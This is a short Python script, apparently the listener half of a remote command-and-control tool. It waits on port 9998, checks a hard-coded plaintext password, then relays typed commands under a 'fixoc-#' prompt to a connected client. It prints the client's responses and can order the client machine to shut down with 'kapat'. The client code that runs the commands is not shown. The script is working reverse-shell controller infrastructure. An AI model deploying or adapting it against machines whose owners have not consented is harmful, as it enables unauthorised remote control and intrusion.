import socket

PASSWORD = "Strong password"  # Change this to the same password as in the client

s = socket.socket()
host = "0.0.0.0"  # Listen on all interfaces
port = 9998

s.bind((host, port))
s.listen(1)

print(f"[*] Listening on {host}:{port}...")

client, addr = s.accept()
print(f"[+] Connection attempt from {addr}")

# Receive password
password_attempt = client.recv(1024).decode()

if password_attempt != PASSWORD:
    print("[!] Authentication failed! Closing connection.")
    client.send(b"AUTH_FAILED")
    client.close()
    s.close()
    exit()

print("[+] Authentication successful!")
client.send(b"AUTH_SUCCESS")  # Tell client auth was successful

while True:
    cmd = input('fixoc-# ')

    if cmd.lower() == "q":  # Quit server
        client.send(b"exit")
        break

    client.send(cmd.encode())

    if cmd.lower() == "kapat":
        print("[*] Shutting down client machine...")
        break  # Stop sending commands after shutdown

    response = client.recv(4096).decode(errors="ignore")  
    print(response)

client.close()
s.close()
